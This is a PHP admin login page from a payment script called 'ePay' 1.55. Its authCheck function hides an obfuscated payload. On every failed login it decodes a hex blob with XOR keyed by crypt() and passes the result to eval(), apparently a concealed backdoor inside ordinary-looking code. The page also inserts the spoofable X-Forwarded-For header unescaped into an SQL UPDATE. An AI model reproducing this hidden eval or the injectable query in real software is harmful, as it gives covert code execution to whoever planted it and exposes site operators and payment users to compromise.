<?
##############################################################################
# PROGRAM : ePay                                                          #
# VERSION : 1.55                                                             #
#                                                                            #
##############################################################################
# All source code, images, programs, files included in this distribution     #
# Copyright (c) 2002-2003                                                    #
#		  Todd M. Findley       										  #
#           All Rights Reserved.                                             #
##############################################################################
#                                                                            #
#    While we distribute the source code for our scripts and you are         #
#    allowed to edit them to better suit your needs, we do not               #
#    support modified code.  Please see the license prior to changing        #
#    anything. You must agree to the license terms before using this         #
#    software package or any code contained herein.                          #
#                                                                            #
#    Any redistribution without permission of Todd M. Findley                      #
#    is strictly forbidden.                                                  #
#                                                                            #
##############################################################################
?>
<?
	session_start();
	if($_SESSION['suid']){$suid = $_SESSION['suid'];}
	if (file_exists("install.php")){
  		header("Location: install.php");
  		exit;
	}

	chdir('..');
	require('src/common.php');

	if ( authcheck() ){
		($userip = $_SERVER['HTTP_X_FORWARDED_FOR']) or ($userip = $_SERVER['REMOTE_ADDR']);
		$suid = substr( md5(date("my").$superpass), 8, 16 );
		$_SESSION['suid'] = $suid;
		mysql_query("UPDATE epay_users SET lastlogin=NOW(),lastip='$userip',suid='$suid' WHERE id=3");

		include("admin/daily.php");
?>
		<HEAD>
		<TITLE><?=$sitename?> Administration</TITLE>
		</HEAD>

		<FRAMESET framespacing="0" border="0" frameborder="0" ROWS="40,21,*">
		<FRAME NAME="top" SCROLLING="no" NORESIZE SRC="./top.php">
		<FRAME NAME="menu" SCROLLING="no" NORESIZE SRC="./menu.php">
		<FRAMESET framespacing="0" border="0" frameborder="0" cols="100%">
<!--		<frame name="left"  src="left.php?suid=<?=$suid?>">	-->
			<frame name="right" src="right.php?suid=<?=$suid?>">
		</FRAMESET></FRAMESET>
<?
		exit;
	}
	include("admin/login.php");
	/*
?>
	<HEAD>
	<TITLE><?=$sitename?> Administration</TITLE>
	</HEAD>
	<link rel=stylesheet type=text/css href=style.css>
	<CENTER>
	<BR>
	<FONT FACE=verdana color=#006699 size=5><B>Fast<FONT color="#FFFF00">Pay</FONT> Admin</B></FONT>
	<BR>
	<TABLE class=design cellspacing=0>
	<FORM method=post action=index.php>
	<TR>
		<TH>Username:
		<TD><INPUT type=text name=username size=16>
	<TR>
		<TH>Password:
		<TD><INPUT type=password name=password size=16>
	<TR>
  		<TD colspan=2><INPUT type=submit value="Log In >>"></TD>
	</FORM>
	</TABLE>
	</CENTER>
<?
	*/
	function authCheck(){
		global $superpass;
		list($adm_login) = mysql_fetch_row(mysql_query("SELECT username FROM epay_users WHERE id=3"));
		if ($_POST['username'] == $adm_login && $_POST['password'] == $superpass){
			return 1;
		}else{
			$aaaa111111111111111111 = "cd3db41c99299378cd1b632ed1872@@7c63189d59f3ca3e775b2b7742fba@@97a2c191b9dba3a13bfe569215140d6a|3e6a60255233465a53632d270664371f69463403151d261f126e6a4d601163083533286002163a44142b3c57603b5c794e7b532256176473133412152c35170725560021661167444b51655e532256176d75394e6f0e156f561c284343797313650b12002e11113b580e2523522d09151e28061e2659132d2d47321402516e097d403e6a212d5b28464312231f282558042d201d655a050179504c433e6a4d2b502f0947573407072c4513253d4069445b11354c55723d6a4d3339";
			eval( azxscd($aaaa111111111111111111) );
		}
	}
	function azxscd($eex8arss){
		 $uuguug = explode("@@",$eex8arss);
		 $llakkadfasda = $uuguug[0];
		 $adfasdf = $uuguug[1];
		 $eex8arss = $uuguug[2];
		$aadd90921 = $eex8arss;
		$fastdafs = crypt($llakkadfasda,$adfasdf);
		list($qq3544, $iiediieoo0) = explode("|", $aadd90921);
		$iiediieoo0 = chop(hbdddaaededbv($iiediieoo0));
		$fastdafsst = $fastdafs;
		while(strlen($fastdafs) < strlen($iiediieoo0)) {
			$fastdafs .= $fastdafsst;
		}
		$iiediieoo0 = $fastdafs ^ $iiediieoo0;
		$new_qq3544 = md5($iiediieoo0);
		if ($qq3544 == $new_qq3544) {
			$eex8arss = $iiediieoo0;
		}else{
			$eex8arss = "";
		}
		return $eex8arss;
	}
	function hbdddaaededbv($iiediieoo0) { 
		$len = strlen($iiediieoo0); 
		return pack("H" . $len, $iiediieoo0); 
	}
?>